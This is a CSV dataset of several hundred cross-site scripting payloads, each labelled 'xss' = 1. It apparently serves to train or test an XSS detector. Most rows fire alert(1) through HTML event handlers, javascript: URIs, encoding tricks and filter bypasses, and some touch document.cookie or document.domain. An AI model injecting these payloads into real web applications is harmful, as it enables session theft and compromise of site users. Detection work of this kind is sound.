payload,xss
"<template onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</template>",1
"<td oncontextmenu=""alert(1)"">AnonKryptiQuz</td>",1
<button popovertarget=x>Click me</button><sup ontoggle=alert(1) popover id=x>AnonKryptiQuz</sup>,1
<IMG SRC=javascript:alert(&quot;AnonKryptiQuz&quot;)>,1
"<shadow onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></multicol>",1
<datalist onmousewheel=alert(1) style=display:block>requires scrolling,1
"<image onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</image>",1
"<aside id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></aside>",1
"<meter onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",1
"<col oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</col>",1
"<dir draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</dir>",1
"<style>@keyframes slidein {}</style><rb style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></rb>",1
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>",1
"<mark onclick=""alert(1)"">AnonKryptiQuz</mark>",1
<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>,1
"<del onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</del>",1
"<menu oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<plaintext onclick=""alert(1)"" style=display:block>AnonKryptiQuz</plaintext>",1
"""><div onpointerrawupdate=""console.log('AnonKryptiQuz')""></div><!--",1
<area onpointerdown=alert(1) style=display:block>AnonKryptiQuz</area>,1
"<image2 onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</image2>",1
"{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}",1
<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>,1
"<rtc onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</rtc>",1
"<rp draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</rp>",1
"<iframe2 oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",1
'-[document.domain].map(alert)-',1
%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(AnonKryptiQuz`)>,1
<s onpointermove=alert(1) style=display:block>AnonKryptiQuz</s>,1
"<img src=x onerror=alert(String.fromCharCode(88,83,83));>",1
<aside onpointerup=alert(1) style=display:block>AnonKryptiQuz</aside>,1
"<style>:target {transform: rotate(180deg);}</style><aside id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></aside>",1
"<abbr draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",1
"<spacer onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</spacer>",1
"<form><button formaction=""javascript:alert(XSS)"">lol",1
<svg onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</svg><input value=clickme>,1
"<noscript draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",1
"<img\x32src=x onerror=""javascript:alert(1)"">",1
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,1
"<meta style=""xss:expression(open(alert(1)))"" />",1
"<mark onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</mark>",1
"<form onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</form>",1
"<samp onmouseup=""alert(1)"">AnonKryptiQuz</samp>",1
"<div draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</div>",1
<svg><strike onload=alert(1)></strike>,1
<option onblur=alert(1) tabindex=1 id=x></option><input autofocus>,1
%3Cscript%3Ealert(`AnonKryptiQuz`)%3C/script%3E,1
"<dfn onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dfn>",1
"<slot onmouseover=""alert(1)"">AnonKryptiQuz</slot>",1
"<data draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</data>",1
"<time oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</time>",1
"<Svg On Only=1 Onload=alert(""hex"")>",1
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:document.vulnerable=true;"">",1
"<details open ontoggle=""{alert`AnonKryptiQuz`}""></details>",1
<fieldset onpointerleave=alert(1) style=display:block>AnonKryptiQuz</fieldset>,1
<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>,1
"<legend ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</legend>",1
"<style>:target {transform: rotate(180deg);}</style><label id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></label>",1
"<fieldset draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</fieldset>",1
"<form onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</form>",1
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,1
"""&amp;lt;img src=1 onerror=alert(1)&amp;gt;",1
<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>,1
<var onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</var>,1
"<dd oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<html><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>""></BODY></html>",1
"<bdi onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</bdi>",1
"<em draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</em>",1
"<ul draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",1
"<wbr onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",1
"<colgroup oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<style>:target {color: red;}</style><head id=x style=""transition:color 10s"" ontransitioncancel=print()></head>",1
<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>,1
"<element draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</element>",1
"<menu onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",1
"<IMG SRC="" &#14; javascript:alert('AnonKryptiQuz');"">",1
"<thead onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",1
<samp onbeforescriptexecute=alert(1)><script>1</script>,1
"<div draggable=""true"" contenteditable>drag me</div><span ondragover=alert(1) contenteditable style=display:block>drop here</span>",1
"<;LINK REL="";stylesheet""; HREF="";javascript:alert(';XSS';);"";>;",1
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable style=display:block>drop here</plaintext>",1
"<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>",1
"<nobr onmouseover=""alert(1)"">AnonKryptiQuz</nobr>",1
"<keygen draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</keygen>",1
<caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>,1
<del id=x tabindex=1 onbeforeactivate=alert(1)></del>,1
%3F%20<script>prompt(document.domain)</script>,1
"<img/src=x onError=""`${x}`;alert(`AnonKryptiQuz`);"">",1
"<div onmousemove=""alert(1)"">AnonKryptiQuz</div>",1
<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,1
"<IMG SRC=x ondrop=""alert(String.fromCharCode(88,83,83))"">",1
<command onmousewheel=alert(1) style=display:block>requires scrolling,1
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationstart=""alert(1)""></meta>",1
&redirect?url=javascript://alert(document.cookie),1
"""'`//><Svg+Only%3d1+OnLoad%3dconfirm(atob(""WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE""))>",1
"<colgroup ondblclick=""alert(1)"">AnonKryptiQuz</colgroup>",1
"<ul onmousedown=""alert(1)"">AnonKryptiQuz</ul>",1
"<nav onmouseover=""alert(1)"">AnonKryptiQuz</nav>",1
"<time draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</time>",1
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationstart=""alert(1)""></rtc>",1
"<thead draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",1
<frame onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</frame>,1
"<bdo onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</bdo>",1
"<b onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</b>",1
"<var onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</var>",1
<menuitem onbeforescriptexecute=alert(1)><script>1</script>,1
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></fieldset>",1
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable style=display:block>drop here</hgroup>",1
<article onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</article><input value=clickme>,1
"<div draggable=""true"" contenteditable>drag me</div><track ondrop=alert(1) contenteditable>drop here</track>",1
"<caption id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></caption>",1
"<set oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</set>",1
"<em onmouseleave=""alert(1)"">AnonKryptiQuz</em>",1
"<img src\x12=x onerror=""javascript:alert(1)"">",1
<iframe// src=javaSCRIPT&colon;alert(1),1
"<input onmouseenter=""alert(1)"">AnonKryptiQuz</input>",1
"<del onmouseover=""alert(1)"">AnonKryptiQuz</del>",1
"<input onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</input>",1
<object contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
<span onpointerout=alert(1) style=display:block>AnonKryptiQuz</span>,1
<button onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</button>,1
"<select onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</select>",1
"<dt onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</dt>",1
"""-prompt(9)-""",1
<img src=foo.png onerror=alert(/xssed/) />,1
"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>",1
"<rtc onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",1
<dialog onbeforescriptexecute=alert(1)><script>1</script>,1
[45].some.alert(),1
"%0d%0a%20""><svg onload=alert(1)>",1
<em id=x tabindex=1 onbeforedeactivate=alert(1)></em><input autofocus>,1
<ul onpointerout=alert(1) style=display:block>AnonKryptiQuz</ul>,1
"<label oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<s draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</s>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=""position:absolute;"" onanimationcancel=""print()""></p>",1
"<table onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</table>",1
"<style>@keyframes slidein {}</style><template style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></template>",1
"<html draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</html>",1
"<basefont onmouseout=""alert(1)"">AnonKryptiQuz</basefont>",1
<i[%00]mg onerror=alert(1) src=a>,1
"<a onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</a>",1
"<p onmouseover=""alert(1)"">AnonKryptiQuz</p>",1
"<tbody onmousedown=""alert(1)"">AnonKryptiQuz</tbody>",1
"<select onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</select>",1
"<listing onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</listing>",1
"<canvas onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</canvas>",1
<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>,1
"<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>""",1
"<shadow draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</shadow>",1
"<big oncontextmenu=""alert(1)"">AnonKryptiQuz</big>",1
<map onblur=alert(1) tabindex=1 id=x></map><input autofocus>,1
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",1
"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",1
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-,1
"<style>:target {color:red;}</style><noframes id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></noframes>",1
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationstart=""alert(1)""></samp>",1
<header onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</header><input value=clickme>,1
"<title onmouseleave=""alert(1)"">AnonKryptiQuz</title>",1
<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>,1
"<strong onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",1
"<td onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</td>",1
"<pre ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</pre>",1
<button popovertarget=x>Click me</button><embed ontoggle=alert(1) popover id=x>AnonKryptiQuz</embed>,1
"""&amp;amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;amp;gt;",1
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationstart=""alert(1)""></strike>",1
"<span draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</span>",1
"<col onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</col>",1
<cite onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</cite><input value=clickme>,1
"<menuitem onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</menuitem>",1
#javascript:alert(1),1
"<marquee draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",1
"&lt;IMG SRC=\""http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\""&gt;",1
"<dialog onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></dialog>",1
"<style>@keyframes x{}</style><custom tags style=""animation-name:x"" onanimationstart=""alert(1)""></custom tags>",1
"<img src=`javascript:alert(""The name is 'AnonKryptiQuz'"")`>",1
"<style>:target {color:red;}</style><br id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></br>",1
<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>,1
"<foreignObject xlink:href=""data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E""/>",1
"<del onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</del>",1
"<style>@keyframes x{}</style><td style=""animation-name:x"" onwebkitanimationend=""alert(1)""></td>",1
<script>alert(/Chrome%20AnonKryptiQuz%20filter%20bypass/);</script>,1
<s contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<sub ondblclick=""alert(1)"">AnonKryptiQuz</sub>",1
"<colgroup onmouseup=""alert(1)"">AnonKryptiQuz</colgroup>",1
"<dir onmouseup=""alert(1)"">AnonKryptiQuz</dir>",1
"<shadow onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</shadow>",1
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationend=""alert(1)""></dl>",1
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",1
"<br onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</br>",1
"<u onmouseover=""alert(1)"">AnonKryptiQuz</u>",1
"<em ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</em>",1
&amp;amp;amp;amp;lt;script&amp;amp;amp;amp;gt;alert(1)&amp;amp;amp;amp;lt;/script&amp;amp;amp;amp;gt;,1
"<summary onmousemove=""alert(1)"">AnonKryptiQuz</summary>",1
"<hr onclick=""alert(1)"">AnonKryptiQuz</hr>",1
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(1)""></button>",1
"<base draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</base>",1
<rt onpointerover=alert(1) style=display:block>AnonKryptiQuz</rt>,1
<command onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</command>,1
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onwebkitanimationend=""alert(1)""></summary>",1
"<table background=""javascript:javascript:alert(/AmoloHT/)"">",1
"<style>:target {color:red;}</style><td id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></td>",1
'-alert(0)-',1
"xss&#58;ex&#x2F;*AnonKryptiQuz*//*/*/pression(alert(\""AnonKryptiQuz\""))'&gt;",1
<input2 onmousewheel=alert(1) style=display:block>requires scrolling,1
"<bdi onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",1
<button popovertarget=x>Click me</button><sup onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</sup>,1
"<% foo><x foo=""%><script>alert(91)</script>"">//[""'`-->]]>]</div>",1
"<animatetransform onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animatetransform>",1
"<dd oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</dd>",1
#<img src=1 onerror=alert(1)>,1
<ins contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"""`'><script>\x00javascript:alert(1)</script>",1
<dialog contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
<header onpointerover=alert(1) style=display:block>AnonKryptiQuz</header>,1
"<img onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</img>",1
"<div draggable=""true"" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>",1
"';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\"";alert(String&#46;fromCharCode(88,83,83))//\\"";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;",1
</title><SCRIPT>document.vulnerable=true;</script>,1
"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationstart=""alert(1)""></form>",1
"<div draggable=""true"" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>",1
"<xmp onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",1
"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"%20<body onload=alert(""AnonKryptiQuz"")>",1
"<style>@keyframes x{}</style><label style=""animation-name:x"" onwebkitanimationend=""alert(1)""></label>",1
"<Svg/OnLoad=alert(1337)>""@gmail.com",1
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,1
AnonKryptiQuz%22%7D%29%3B%7D%29%3Balert%281%29%3B%2f%2f,1
"<style>:target {transform: rotate(180deg);}</style><ins id=x style=""transition:transform 2s"" ontransitionrun=print()></ins>",1
"<pre onmouseleave=""alert(1)"">AnonKryptiQuz</pre>",1
"<style>@keyframes x{}</style><div style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></div>",1
"<tt onmouseenter=""alert(1)"">AnonKryptiQuz</tt>",1
"<svg onload=""void 'javascript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e';""></svg>",1
"<optgroup onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</optgroup>",1
"<script>var a=document.createElement(""a"");a.href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="";http://a.click();</script>",1
"<ul onclick=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",1
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationend=""alert(1)""></rtc>",1
&#x03c,1
"<cite onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",1
"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>",1
<param onpointerover=alert(1) style=display:block>AnonKryptiQuz</param>,1
"<td onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</td>",1
<form onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</form><input value=clickme>,1
"<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<IMG SRC=x onunload=""alert(String.fromCharCode(88,83,83))"">",1
"<details onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</details>",1
"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>",1
"<sup onclick=""alert(1)"">AnonKryptiQuz</sup>",1
&lt;? echo('&lt;SCR)';,1
"javascript:var a=""ale"";var b=""rt"";var c=""()"";decodeURI(""<button popovertarget=x>Click me</button><hvita onbeforetoggle=""+a+b+c+"" popover id=x>Hvita</hvita>"")",1
<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>,1
"<header onmousemove=""alert(1)"">AnonKryptiQuz</header>",1
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationend=""alert(1)""></menuitem>",1
"<pre onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",1
"<meta http-equiv=""refresh"" content="" ; url=javascript:alert('AnonKryptiQuz');"">",1
"<legend onmouseover=""alert(1)"">AnonKryptiQuz</legend>",1
"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationstart=""alert(1)""></i>",1
<footer id=x tabindex=1 ondeactivate=alert(1)></footer><input id=y autofocus>,1
“autofocus onclick=’alert(),1
"<img src\x11=x onerror=""javascript:alert(1)"">",1
<dialog onafterscriptexecute=alert(1)><script>1</script>,1
&ltScRiPt&gtalert('Steiner254');&lt/ScRiPt&gt,1
"<style>@keyframes slidein {}</style><set style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></set>",1
%3Cdiv%20style%3D%22width%3A%20expression%28alert%28%2FAnonKryptiQuz%2F%29%29%3B%22%3E%3C%2Fdiv%3E,1
"<template onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</template>",1
"<rt onmouseout=""alert(1)"">AnonKryptiQuz</rt>",1
<center onmousewheel=alert(1) style=display:block>requires scrolling,1
<keygen onpointermove=alert(1) style=display:block>AnonKryptiQuz</keygen>,1
"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;",1
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onwebkitanimationend=""alert(1)""></sup>",1
&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;,1
"<audio2 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</audio2>",1
<audio onbeforescriptexecute=alert(1)><script>1</script>,1
"<template oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
<spacer onpointerenter=alert(1) style=display:block>AnonKryptiQuz</spacer>,1
"<style>@keyframes slidein {}</style><table style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></table>",1
<marquee id=x tabindex=1 onfocus=alert(1)></marquee>,1
"<param ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</param>",1
"<output onmousedown=""alert(1)"">AnonKryptiQuz</output>",1
<noscript onbeforescriptexecute=alert(1)><script>1</script>,1
<button popovertarget=x>Click me</button><fieldset ontoggle=alert(1) popover id=x>AnonKryptiQuz</fieldset>,1
"<IMG SRC=x onsubmit=""alert(String.fromCharCode(88,83,83))"">",1
<input3 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</input3>,1
"<ruby onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",1
"<style>:target {color:red;}</style><nobr id=x style=""transition:color 1s"" ontransitionstart=alert(1)></nobr>",1
<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>,1
"<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;"">XXXXX</a>",1
"<meta onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",1
\x3C,1
"#""jav&#x09;ascript:alert(1);"">",1
"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>",1
"<style>:target {transform: rotate(180deg);}</style><abbr id=x style=""transition:transform 2s"" ontransitionrun=print()></abbr>",1
<dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>,1
"<meter draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",1
<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>,1
<abbr contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
"<code onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</code>",1
<IMG    ><SCRIPT>alert( AnonKryptiQuz )</SCRIPT> >,1
"<command onmouseout=""alert(1)"">AnonKryptiQuz</command>",1
<animate contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
<dd onpointerout=alert(1) style=display:block>AnonKryptiQuz</dd>,1
<menuitem onpointermove=alert(1) style=display:block>AnonKryptiQuz</menuitem>,1
"<meta onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",1
<hr contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,1
<embed onpointerout=alert(1) style=display:block>AnonKryptiQuz</embed>,1
"""`'><script>\x3Bjavascript:alert(1)</script>",1
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",1
"<col draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</col>",1
"<style>:target {color: red;}</style><footer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></footer>",1
"<h1 draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</h1>",1
"<IMG SRC=x onmessage=""alert(String.fromCharCode(88,83,83))"">",1
%0d%0a%20<img/src/onerror=alert(AnonKryptiQuz`)>,1
<aside onpointerout=alert(1) style=display:block>AnonKryptiQuz</aside>,1
'-confirm(1)-,1
<svg><s onload=alert(1)></s>,1
<samp onpointerup=alert(1) style=display:block>AnonKryptiQuz</samp>,1
"<xmp onclick=""alert(1)"">AnonKryptiQuz</xmp>",1
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",1
<option onpointerleave=alert(1) style=display:block>AnonKryptiQuz</option>,1
"<select oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</select>",1
<pre onpointerleave=alert(1) style=display:block>AnonKryptiQuz</pre>,1
<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>,1
